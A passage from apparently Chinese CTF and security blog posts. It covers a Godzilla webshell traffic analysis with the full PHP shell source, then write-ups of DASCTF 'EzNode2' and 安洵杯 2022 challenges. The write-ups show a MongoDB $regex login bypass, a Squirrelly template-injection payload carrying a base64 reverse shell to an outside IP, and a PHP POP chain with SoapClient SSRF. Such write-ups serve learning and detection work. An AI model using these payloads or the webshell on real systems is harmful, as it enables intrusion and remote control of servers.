引入的一个特征，并不是作者自定义的 Accept。同样的这个默认特征也可以通过自定义头部去除，只能作为默认情况下的辅助检测特征</p><h3 id="请求体特征"><a href="#请求体特征" class="headerlink" title="请求体特征"></a>请求体特征</h3><h4 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP_XOR_BASE64"></a>PHP_XOR_BASE64</h4><p><img src="image-20220423163418629.png" alt="image-20220423163418629"></p><p>以默认 shell 的密码和密钥为例，生成的文件如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123; <span class="comment">//进行异或加解密的函数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123; <span class="comment">//对上传代码做执行并得到结果</span></span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原始代码-&gt;base64编码-&gt;异或加密</p><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>首次连接时会有三个连续的请求</p><p><img src="image-20220423164218835.png" alt="image-20220423164218835"></p><p><strong>第一个数据包</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/hackable/uploads/godzilla.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8081</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"> </span><br><span class="line">pass=R0YEQgNVBE0GQ0YPU0YTUhoeTAtv............URVEaQgBDWTVrRG47</span><br></pre></td></tr></table></figure><p>根据加密代码的分析，对pass进行解密后为各种功能的脚本</p><p><img src="image-20220423172534851.png" alt="image-20220423172534851"></p><p>可以发现该数据包并没有回包，可以作为流量识别的其中一个重要特征</p><p><strong>第二个数据包</strong></p><p><img src="image-20220423172841374.png" alt="image-20220423172841374"></p><p>根据代码分析对会包的字符串进行解密（分析过程比较复杂，敬请期待）得到OK</p><p>说明该请求一条测试请求，证明shell连接成功</p><p><strong>第三个数据包</strong></p><p>该请求的作用是获取目标的环境信息：</p><p><img src="image-20220423173837035.png" alt="image-20220423173837035"></p><p>解密得到原始代码 <code>methodName=Z2V0QmFzaWNzSW5mbw==</code>，即 <code>methodName=getBasicsInfo</code>。此操作调用 payload 中的 getBasicsInfo 方法获取目标环境信息向客户端返回。显然，这个过程又是一个固定特征</p><p>至此，成功挖掘到哥斯拉客户端与 shell 建连初期的三个固定行为特征，且顺序出现在同一个 TCP 连接中。可以总结为：</p><ul><li>发送一段固定代码（payload），http 响应为空</li><li>发送一段固定代码（test），执行结果为固定内容</li><li>发送一段固定代码（getBacisInfo）</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022NOV月赛</title>
      <link href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/"/>
      <url>/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="EzNode2"><a href="#EzNode2" class="headerlink" title="EzNode2"></a>EzNode2</h1><p>给了源码  </p><p>首先是通过MongoDB注入绕过登录，过滤如下：</p><p><img src="image-20221129191909274.png" alt="image-20221129191909274"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function filter(str) &#123;    return /gt|lt|lte|gte|eq|ne|where/.test(str)&#125;</span><br></pre></td></tr></table></figure><p>没有过滤 $regex ，然后根据html源码可知用户名为admin，所以payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;$regex&quot;:&quot;^admi&quot;&#125;,&quot;password&quot;: &#123;&quot;$regex&quot;:&quot;.*&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20221129191809781.png" alt="image-20221129191809781"></p><p>绕过 登陆了</p><p>跟他redit</p><p><img src="image-20221129192019839.png" alt="image-20221129192019839"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^admi&amp;password[$regex]=.*</span><br></pre></td></tr></table></figure><p>其实源码 也看出来upload 了</p><p><img src="image-20221129192420514.png" alt="image-20221129192420514"></p><p><img src="image-20221129192457342.png" alt="image-20221129192457342"></p><p>  发现  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data.output = &#x27;&#123;&quot;id&quot;:&quot;3&quot;, &quot;filename&quot;:&quot;&#x27; + req.files.file.name + &#x27;&quot;, &quot;filesize&quot;:&quot;&#x27; + req.files.file.size + &#x27;&quot;, &quot;mimetype&quot;:&quot;&#x27; + req.files.file.mimetype + &#x27;&quot;, &quot;filehash&quot;:&quot;&#x27; + req.files.file.md5 + &#x27;&quot;&#125;&#x27;</span><br><span class="line">        res.render(&#x27;home.squirrelly&#x27;, JSON.parse(data.output));</span><br></pre></td></tr></table></figure><p>这会把文件名 加进去解析了 </p><p>这里拼接json字符串再用 JSON.parse 解析显得很多此一举，并且其中的 name 和 mimetype 都是可以控制的，显然存在属性注入。</p><p>再查看使用的引擎为 squirrelly 搜索可知该引擎存在渲染漏洞 CVE-2021-32819 ，该漏洞简单的说就是渲染时给一个 defaultFilter 属性，该属性会注入到代码中执行也就造成了RCE。那么思路就是在json拼接时注入一个 defaultFilter 即可。</p><p>最终payload就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QQ.jpg\&quot;,\&quot;autoEscape\&quot;:false,\&quot;defaultFilter\&quot;:\&quot;e&#x27;);require = global.require || global.process.mainModule.constructor._load; require(&#x27;child_process&#x27;).exec(&#x27;echo  L2J....Q==（base64的一句话shell）|base64 -d|bash&#x27;);c.l(&#x27;F&#x27;,&#x27;e</span><br><span class="line"></span><br><span class="line">&quot;QQ.jpg\&quot;,\&quot;autoEscape\&quot;:false,\&quot;defaultFilter\&quot;:\&quot;e&#x27;);require = global.require || global.process.mainModule.constructor._load; require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuMjQ5LjIyLjM2Lzk5OTkgIDA+JjE=|base64 -d|bash&#x27;);c.l(&#x27;F&#x27;,&#x27;e&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>吸取教训       <img src="image-20221129213059524.png" alt="image-20221129213059524"></p><p>一直打过去500  回头发现在线工具 base和工具base结果不同   </p><p><img src="image-20221129213256327.png" alt="image-20221129213256327"></p><p>弹了shell都解决了</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2022</title>
      <link href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/"/>
      <url>/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/</url>
      
        <content type="html"><![CDATA[<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">// index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//something in flag.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = &quot;babyhacker&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;</span><br><span class="line">            $this-&gt;b-&gt;uwant();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $k;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $this-&gt;k;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $cc = $this-&gt;c;</span><br><span class="line">        return $cc();</span><br><span class="line">    &#125;</span><br><span class="line">    public function uwant()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;a == &quot;phpinfo&quot;) &#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $tmp = array(reset($_SESSION), $this-&gt;a);</span><br><span class="line">            call_user_func($tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;</span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    if (isset($_POST[&quot;pop&quot;])) &#123;</span><br><span class="line">        unserialize($_POST[&quot;pop&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">//flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag在根目录下</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;63127.0.0.1&quot;)&#123;</span><br><span class="line">    $f1ag=implode(array(new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])));</span><br><span class="line">    $_SESSION[&quot;F1AG&quot;]= $f1ag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;only localhost!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php一开始没注意 后边发现 和<code>bestphp‘s revenge</code>这道题很像 </p><p> 但是做题的时候由于不够熟练 导致没做出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag在根目录下</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">    $f1ag=implode(array(new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])));</span><br><span class="line">    $_SESSION[&quot;F1AG&quot;]= $f1ag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;only localhost!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>的反序列化链很好找</p><p><code>B的__destruct中的die()函数去触发C的__ToString 然后触发A的invoke去触发C::uwant的call_user_func</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">B::__destruct:die()    -&gt;          </span><br><span class="line">C::__toString:$cc();    -&gt;    </span><br><span class="line">A::__invoke      -&gt;    </span><br><span class="line">C::uwant:call_user_func</span><br></pre></td></tr></table></figure><p>​    需要绕过一个<code>md5</code>的碰撞和一个<code>__wakeup      </code></p><p>md5传一个md5前后都是0e的就可以 随便搜一个就行 <code>0e215962017</code>     </p><p>__wakeup绕过老生常谈 <code>序列化后属性和原来的数量不同即可</code></p><p>构造链子实现phpinfo </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//something in flag.php</span><br><span class="line"></span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = &quot;babyhacker&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;invoke&quot;;</span><br><span class="line">        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;</span><br><span class="line">            echo &quot;yes&quot;;</span><br><span class="line">            $this-&gt;b-&gt;uwant();</span><br><span class="line">            echo &quot;yes1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $k;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $this-&gt;k;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $cc = $this-&gt;c;</span><br><span class="line">        echo &quot;tostring&quot;;</span><br><span class="line">        return $cc();</span><br><span class="line">    &#125;</span><br><span class="line">    public function uwant()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;uwant&quot;;</span><br><span class="line">        if ($this-&gt;a == &quot;phpinfo&quot;) &#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            call_user_func(array(reset($_SESSION), $this-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b = new B();</span><br><span class="line">$b-&gt;a = new C();</span><br><span class="line">$b-&gt;a-&gt;a=&quot;phpinfo&quot;;</span><br><span class="line">$b-&gt;a-&gt;c= new A();</span><br><span class="line">$b-&gt;a-&gt;c-&gt;a = &#x27;0e1284838308&#x27;;</span><br><span class="line">$b-&gt;a-&gt;c-&gt;b = $b-&gt;a;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$s=serialize($b);</span><br><span class="line">echo $s;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">unserialize($s);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这样还是不能拿到flag  仅凭pop链子什么都做不了 这个时候看到flag.php</p><p>考虑<code>SoapClient</code>和构造<code>ssrf </code>苦于没啥经验 没用明白</p><p>而且session反序列化也不知道从何处下手</p><p>复现才发现自己多脑馋</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;</span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考虑到session可控，而且还给了<code>ini_set</code>函数，配合<code>SoapClient</code>类打一个<code>SSRF</code>，访问<code>flag.php </code>那首先写一个<code>ssrf.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target=&#x27;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&#x27;;</span><br><span class="line">$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,</span><br><span class="line">    &#x27;user_agent&#x27; =&gt; &quot;Pale1c\r\nCookie:PHPSESSID=pppale1c\r\n&quot;,</span><br><span class="line">    &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">echo &quot;|&quot;.urlencode($a);</span><br></pre></td></tr></table></figure><p>通过传参将反序列化的值保存到<code>sess</code>文件里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d0g3传</span><br><span class="line">得是session解析器类型 baby传session.serialize_handler 就行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="image-20221128145234867.png" alt="image-20221128145234867"></p><p>然后改变php反序列化引擎为php_serialize，以便触发session反序列化</p><hr><p><img src="image-20221128151910344.png" alt="image-20221128151910344"></p><p><img src="image-20221128151932935.png" alt="image-20221128151932935"></p><p><img src="image-20221128151940632.png" alt="image-20221128151940632"></p><p>然后传入pop链子</p><p>不要触发phpinfo了 触发一个没有的类 </p><p><code>O:1:&quot;B&quot;:4:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;www&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;N;&#125;</code></p><p>报500 是执行成功了  妈的</p><p>还以为  不行  </p><p><img src="image-20221128152057991.png" alt="image-20221128152057991"></p><p>然后重新访问</p><p><img src="image-20221128152124156.png" alt="image-20221128152124156"></p><p>sessid换成这个</p><p><img src="image-20221128152140769.png" alt="image-20221128152140769"></p><p>不知道怎么查flag  </p><p>php 原生类，在看提示，flag 在根目录,我们也是通过这个入口点进行读取，找到一个 php 原生类，进行读取 <code>DirectoryIterator</code> 。 同样获取fflag的方式获取文件名</p><p><a href="https://s1.ax1x.com/2022/11/28/zU0vJx.png"><img src="zU0vJx.png" alt="img"></a></p><p>然后 flag 文件为：<code>f1111llllllaagg。</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;http://127.0.0.1/flag.php?a=DirectoryIterator&amp;b=glob:///*f*&quot;;  #只能尼玛这么写 他是f1不是fl 操</span><br><span class="line">$b = new SoapClient(null, array(&#x27;uri&#x27; =&gt; $url, &#x27;location&#x27; =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(&#x27;^^&#x27;, &quot;\r\n&quot;, $a);</span><br><span class="line">echo &quot;|&quot; . urlencode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>也是先传php 然后 php_serialize解析 然后打pop 执行内置类  然后换session</p><p><img src="image-20221128152751779.png" alt="image-20221128152751779"></p><p>真够恶心的 我也购彩的</p><h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p>恶臭的文件上传  </p><p>只能传php  phpinfo可以看  </p><p>$等被ban rce函数被ban  base64等编码函数被ban</p><p><img src="QQ%E5%9B%BE%E7%89%8720221128153211.png" alt="QQ图片20221128153211"></p><p>看了大手子wp 用的字符串转义  以前没用过 要补课了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def hex_payload(payload):</span><br><span class="line">     res_payload = &#x27;&#x27;</span><br><span class="line">     for i in payload:</span><br><span class="line">        i = &quot;\\x&quot; + hex(ord(i))[2:]</span><br><span class="line">        res_payload += i</span><br><span class="line">     print(&quot;[+]&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;.format(payload,res_payload))</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    payload = input(&quot;Input payload: &quot;)</span><br><span class="line">    